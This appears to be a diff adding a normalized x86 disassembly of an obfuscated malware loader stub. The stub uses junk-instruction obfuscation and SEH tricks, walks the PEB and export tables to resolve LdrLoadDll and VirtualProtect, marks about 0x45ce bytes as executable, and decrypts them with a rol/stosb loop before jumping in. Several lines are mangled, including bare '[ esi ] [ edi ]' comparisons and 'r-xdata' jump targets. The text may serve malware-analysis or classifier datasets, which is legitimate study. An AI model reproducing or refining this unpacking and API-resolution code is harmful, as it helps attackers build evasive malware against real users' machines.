@@ -1,0 +1,476 @@
+_start
+pushad
+xor ebx ebx
+push esp
+sub ebx 0xffffffff
+mov esi [ esp ]
+add esp 0x4
+and edx edx
+sbb ebx 0xffffffff
+or ecx ecx
+sbb esi 0x4
+or esi esi
+sbb ebx 0xffffffff
+neg ebx
+call $+5
+sub [ esi ] ebx
+retn
+sub_11002032
+xor ebx ebx
+xor eax eax
+xor eax ebx
+stc
+sbb ah 0x0
+add ah 0xff
+mov al ah
+mov ebp 0x0
+sub ebp ebx
+neg ebp
+call $+5
+add [ esp ] ebx
+jmp [ esp ]
+mov ebx 0x0
+sub ebx ebp
+neg ebx
+mov esi 0x0
+add esi [ esp ]
+sub ebp 0xffffffff
+movzx edx [ esi + ebp - 0x2 ]
+sub esp 0x4
+mov [ esp ] edx
+sub edx eax
+pop edx
+jne r-xdata
+add [ eax ] al
+add [ eax ] al
+sub_110020b7
+push [ fs : 0x0 ]
+add edi esi
+xor ecx ecx
+xor ecx 0xffff
+not eax
+and edx edx
+adc edi esi
+mov [ fs : 0x0 ] esp
+and edi eax
+or edi edi
+adc edi esi
+or ebx ebx
+jno r-xdata
+call $+5
+call sub_110020b7
+add esp 0xfffffffc
+mov [ esp ] eax
+xor eax eax
+or eax [ esp + 0x10 ]
+test eax eax
+sbb [ eax + 0xb8 ] 0xffffffff
+test ebx ebx
+sbb [ eax + 0xb8 ] 0xffffffff
+mov eax [ esp ]
+add esp 0x4
+push eax
+xor eax [ esp ]
+sub esp 0xfffffffc
+retn 0x10
+add esp 0x4
+mov ebx [ esp - 0x4 ]
+mov ebx 0x0
+or ebx [ esp ]
+mov [ fs : 0x0 ] ebx
+and edi edi
+adc esp 0x8
+push edi
+pop esi
+and ebx 0x0
+or ebx [ edi + 0x3c ]
+and eax eax
+adc edi ebx
+mov ebx 0x0
+or ebx 0x4550
+mov edx 0x0
+or edx [ edi ]
+call $+5
+mov [ esp ] ebx
+test ebx ebx
+sbb ebx edx
+pop ebx
+jne r-xdata
+jmp [ esp ]
+popad
+mov eax 0x0
+or eax 0x1
+retn 0xc
+and ebx 0x0
+add ebx [ edi + 0x78 ]
+push ebx
+pop edi
+add edi esi
+call $+5
+mov [ esp ] edi
+mov ebx 0x0
+sub ebx [ edi + 0x20 ]
+neg ebx
+sub edi edi
+add edi ebx
+or eax eax
+adc edi esi
+push esi
+add esp 0xfffffffc
+mov [ esp ] edi
+add esp 0x4
+mov esi [ esp - 0x4 ]
+pop ebx
+push edx
+xor edx [ esp ]
+or eax eax
+adc esp 0x4
+push esi
+pop eax
+xor ecx ecx
+xor ecx [ esi ]
+mov esi 0x0
+add esi ecx
+call $+5
+mov ebp esp
+add esi ebx
+sub esp 0x4
+mov [ esp ] 0x6c6c
+sub esp 0x4
+mov [ esp ] 0x4464616f
+sub esp 0x4
+mov [ esp ] 0x4c72644c
+xor edi edi
+xor edi esp
+sub ecx ecx
+add ecx 0xb
+[ esi ] [ edi ]
+je r-xdata
+test ecx ecx
+sbb edi esi
+sub esp 0x4
+mov [ esp ] ebx
+xor ebx [ esp ]
+add esp 0x4
+mov ebx [ edi ]
+mov edx 0x0
+add edx 0x5a4d
+and ebx ecx
+add esp 0xfffffffc
+mov [ esp ] ebx
+test edx edx
+sbb ebx edx
+pop ebx
+je r-xdata
+and ebx ebx
+mov esp 0x0
+adc esp ebp
+pop esi
+push ebx
+sub esp 0x4
+mov [ esp ] edx
+pop eax
+pop esi
+mov edi [ esp ]
+add esp 0x4
+and ecx 0x0
+or ecx edi
+sub ebx ebx
+add ebx [ edi + 0x24 ]
+xor edi edi
+xor edi ebx
+and edx edx
+adc edi esi
+xor ebx ebx
+or ebx [ edi + eax * 2 ]
+and ebx 0xffff
+xor eax eax
+add eax ebx
+mov ebx 0x0
+xor ebx [ ecx + 0x10 ]
+and eax eax
+sbb eax ebx
+test edi edi
+sbb eax 0xffffffff
+mov edi 0x0
+or edi [ ecx + 0x1c ]
+add edi esi
+and ebx 0x0
+add ebx [ edi + eax * 4 ]
+test ecx ecx
+adc esi ebx
+and ebp 0x0
+add ebp esp
+add esp 0xfffffffc
+mov [ esp ] ebx
+xor ebx [ esp ]
+sub esp 0xfffffffc
+sub esp 0x4
+mov [ esp ] ebx
+mov edi 0x0
+add edi esp
+add esp 0xfffffffc
+mov [ esp ] ebx
+push 0x6c006c
+push 0x64002e
+push 0x320033
+push 0x6c0065
+push 0x6e0072
+push 0x65006b
+push esp
+add esp 0xfffffffc
+mov [ esp ] 0x1a0018
+mov edx 0x0
+or edx esp
+call $+5
+mov [ esp ] edi
+sub esp 0x4
+mov [ esp ] edx
+add esp 0xfffffffc
+mov [ esp ] ebx
+add esp 0xfffffffc
+mov [ esp ] ebx
+call $+5
+mov [ esp ] esi
+call $+5
+mov [ esp ] edi
+pop esi
+pop ebx
+call ebx
+sub eax eax
+add eax [ esi ]
+call $+5
+mov [ esp ] eax
+add esp 0x4
+mov ebx [ esp - 0x4 ]
+xor edx edx
+xor edx [ fs : 0x30 ]
+xor esi esi
+add esi [ edx + 0x10 ]
+mov [ esi + 0x18 ] ebx
+xor esp esp
+or esp ebp
+and edx 0x0
+add edx [ fs : 0x30 ]
+mov esi 0x0
+xor esi [ edx + 0x10 ]
+mov edi 0x0
+sub edi [ esi + 0x18 ]
+neg edi
+push edi
+pop esi
+and ebx 0x0
+add ebx [ edi + 0x3c ]
+test ebx ebx
+adc edi ebx
+mov ebx [ edi + 0x78 ]
+sub edi edi
+add edi ebx
+test edx edx
+adc edi esi
+sub esp 0x4
+mov [ esp ] edi
+and edi edi
+mov ebx 0x0
+adc ebx [ edi + 0x20 ]
+mov edi 0x0
+xor edi ebx
+add edi esi
+sub esp 0x4
+mov [ esp ] esi
+add esp 0xfffffffc
+mov [ esp ] edi
+mov esi [ esp ]
+add esp 0x4
+mov ebx [ esp ]
+add esp 0x4
+push edx
+xor edx [ esp ]
+test ecx ecx
+sbb esp 0xfffffffc
+xor eax eax
+add eax esi
+and ecx 0x0
+or ecx [ esi ]
+mov esi 0x0
+add esi ecx
+call $+5
+mov ebp 0x0
+xor ebp esp
+or edx edx
+adc esi ebx
+call $+5
+mov [ esp ] 0x7463
+add esp 0xfffffffc
+mov [ esp ] 0x65746f72
+add esp 0xfffffffc
+mov [ esp ] 0x506c6175
+push 0x74726956
+xor edi edi
+add edi esp
+mov ecx 0x0
+add ecx 0xf
+[ esi ] [ edi ]
+je r-xdata
+and edx edx
+adc edx 0x1
+test edi edi
+adc eax 0x4
+push [ eax ]
+pop esi
+xor esp esp
+xor esp ebp
+jmp [ esp ]
+and esp 0x0
+add esp ebp
+pop esi
+call $+5
+mov [ esp ] ebx
+call $+5
+mov [ esp ] edx
+add esp 0x4
+mov eax [ esp - 0x4 ]
+add esp 0x4
+mov esi [ esp - 0x4 ]
+add esp 0x4
+mov edi [ esp - 0x4 ]
+push edi
+pop ecx
+push [ edi + 0x24 ]
+pop ebx
+mov edi 0x0
+or edi ebx
+add edi esi
+push [ edi + eax * 2 ]
+pop ebx
+and ebx 0xffff
+xor eax eax
+xor eax ebx
+mov ebx 0x0
+or ebx [ ecx + 0x10 ]
+sub eax ebx
+and edx edx
+adc eax 0x1
+xor edi edi
+xor edi [ ecx + 0x1c ]
+test esi esi
+adc edi esi
+mov ebx 0x0
+sub ebx [ edi + eax * 4 ]
+neg ebx
+and edx edx
+adc esi ebx
+xor ecx ecx
+add ecx 0x1000
+call $+5
+mov edi [ esp ]
+add esp 0x4
+and edi 0xfffff000
+and esi esi
+adc edi ecx
+add edi ecx
+call $+5
+mov [ esp ] edi
+mov edx 0x0
+sub edx 0x4
+neg edx
+call $+5
+and eax eax
+adc edi ecx
+mov ebx 0x0
+xor ebx [ edi ]
+add edx 0xffffffff
+je r-xdata
+test edi edi
+adc edx 0x1
+and esi esi
+adc eax 0x4
+mov esi 0x0
+sub esi [ eax ]
+neg esi
+xor esp esp
+or esp ebp
+jmp [ esp ]
+pop ebx
+add esp 0x4
+mov edi [ esp - 0x4 ]
+push ebx
+push esp
+push 0x40
+push 0x45ce
+call $+5
+mov [ esp ] edi
+call $+5
+mov [ esp ] esi
+sub esp 0x4
+mov [ esp ] edi
+mov esi [ esp ]
+add esp 0x4
+mov ebx [ esp ]
+add esp 0x4
+call $+5
+pop eax
+add eax 0x1d
+push eax
+call $+5
+mov [ esp ] ebp
+test esi esi
+mov ebp 0x0
+adc ebp esp
+or edx edx
+adc ebx 0x5
+jmp ebx
+jmp [ esp ]
+sub_11002514
+add esp 0x4
+mov ebx [ esp - 0x4 ]
+xor edi edi
+or edi esi
+mov eax 0x0
+xor eax 0xc
+test eax eax
+adc edi eax
+test esi esi
+mov esi 0x0
+adc esi edi
+xor ebp ebp
+xor ebp edi
+mov ecx 0x0
+add ecx 0x452c
+mov edx 0x0
+sub edx ecx
+neg edx
+call $+5
+test ebx ebx
+adc esi 0x1
+pop ecx
+sub ecx 0x1
+je r-xdata
+stosb [ edi ]
+add esp 0x4
+mov eax [ esp - 0x4 ]
+call ebp
+test ecx ecx
+adc eax ebx
+test ecx ecx
+adc ecx edx
+popad
+mov eax 0x0
+or eax 0x1
+retn 0xc
+jmp [ esp ]
+xor eax eax
+add eax [ esi ]
+rol al cl
+push edx
+xor eax [ esp ]
+add esp 0x4
+call $+5
+mov [ esp ] ecx
+sub ecx ecx
+add ecx 0x40
+call $+5
+mov [ esp ] ecx
+xor ecx ebx
+pop ecx
+je r-xdata
